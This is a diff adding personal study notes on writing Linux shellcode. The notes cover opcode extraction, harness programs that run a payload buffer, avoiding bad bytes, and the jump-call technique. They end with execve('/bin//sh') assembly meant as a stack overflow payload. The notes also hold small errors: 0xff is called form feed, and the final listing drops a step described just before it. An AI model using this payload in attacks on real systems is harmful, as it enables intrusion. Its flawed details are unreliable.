@@ -1,0 +1,150 @@
+- Concept
+    - Shellcode is a machine code that can be used as a payload.
+        - To be injected in stack overflow attacks.
+    - They are obtained from assembly language.
+    - Generating Shellcode
+        - Write what we want the shellcode to in assembly.
+        - Perform modifications
+        - Convert it to machine code    
+            Objdump -D -M intel my_prog
+        - Extract the machine code and put \x infront
+    - Automatically converting machin code to \x form use the 
+    following
+        for i in `Objdump -d file_name | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}'`;
+        do echo -n "\x$i"; done
+- C program for running the shellcode
+    #include <stdio.h>
+    #include <string.h>
+
+    const char code [] = "\xeb...";
+    int main ()
+    {
+        int *ret;
+        ret = (int *) &ret + 2;
+        (*ret) = (int) code;
+    }
+
+    OR
+
+    int main()
+    {
+        printf("Length %d \n", (int) strlen(code));
+        int (*ret) () = (int (*)()) code;
+        ret();
+    }
+    - Compine one of the two programs
+        gcc -m32 -fno-stack-protector -z execstack
+- Bad characters
+    - characters that breaks execution
+        - 00 : zero or null terminator (\0)
+        - 0A : line feed (\n)
+        - ff : form feed (\f)
+        - 0D : carraige return
+    - Removing this bad characters
+        - use the size that fits the value
+        - use arthimetic operation as an alternative
+            xor eax, eax
+            add eax, 1
+- Removing hardcoded addresses
+    - There are three techniques
+        - Relative Address techniques
+        - Jump-Call techniques
+        - Stack techniques
+- Relative Address Techniques 
+    - Current location to RIP register
+    - Relative address is useful to avoid using hard coded address
+    - The syntax is
+        lea <dest.>, [rel <src>]
+
+    example
+        _start:
+            jmp code
+            hello_world: db 'Hello World', 0xa
+        code:
+            mov al, 1
+            ..
+            lea rsi, [rel hello_world]
+            ..
+
+- Jump-Call Techniques
+    - make jmp instructio to a string we want to move a specific 
+    register
+    - we make an actual call using call instruction whic pushes 
+    string address to the stack.
+    - We pop the address to a register
+    - example
+        _start:
+            jmp string
+        code:
+            pop rsi
+            mov al, 1
+            ...
+        string:
+            call code
+            hello_world: db 'Hello World', 0xa
+- Stack Techniques
+    - Examine execve
+        man 2 execve
+        - First argument : Program we want to execute
+        - Second argument : argv pointer to an array of arguments
+            - argv should contain program file_name
+        - Tird argument : Environment variables
+    - Design the c program (optional)
+        #include <unistd.h>
+
+        int main ()
+        {
+            char *const argv[] = {"cat", "/etc/issue", NULL};
+            execve ("/bin/cat", argv, NULL);
+            return 0;
+        }
+
+    - Converting /bin/sh to assembly
+        1. We need to use NULL as a sign of separation
+            - we move rsp to the rdx to get the 3rd argument
+                xor rax, rax
+                push rax
+                mov rdx, rsp
+        2. We need to push the path "/bin/sh"
+            - Since, we only have 7 bytes and because we dont 
+            want any zero bytes lets change
+                "/bin/sh" to "//bin/sh" or "/bin//sh"
+            - reverse and encode it using python
+                >>> string="//bin/sh"
+                >>> string[::-1].encode("hex")
+                68732f6e69622f2f
+            - move to rbx and push to the stack
+                mov rbx, 0x68732f6e69622f2f
+                push rbx
+            - mov rsp to rdi to get the second argument
+                mov rdi, rsp
+            - push as a string separator null
+                push rax
+            - we need a pointer to our string to get our first 
+            argument
+                push rdi
+                mov rsi, rsp
+            - Now, all arguments are ready, lets make the
+            system call
+                add rax, 59
+                syscall
+
+        3. Full program
+            global _start
+            
+            section .text
+                xor rax, rax
+                push rax
+                mov rdx, rsp
+
+                mov rbx, 0x68732f6e69622f2f
+                push rbx
+                mov rdi, rsp
+
+                push rdi
+                mov rsi, rsp
+
+                add rax, 59
+                syscall
+
+
